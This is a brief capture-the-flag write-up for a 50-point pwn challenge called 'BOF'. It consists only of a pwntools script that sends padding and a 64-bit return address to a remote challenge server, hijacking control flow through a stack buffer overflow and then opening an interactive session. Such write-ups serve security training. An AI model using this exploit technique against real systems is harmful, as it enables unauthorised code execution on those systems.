# BOF
**Category**: pwn
**Points**: 50

# write-up
```python
from pwn import *

#p = process('./vuln')
p = remote('139.59.30.165',8700)
#context.terminal = ['tmux', 'splitw', '-h']



payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2A"
payload += p64(0x400766)
pause()
p.recvuntil(">>> ")
p.sendline(payload)
p.interactive()
```
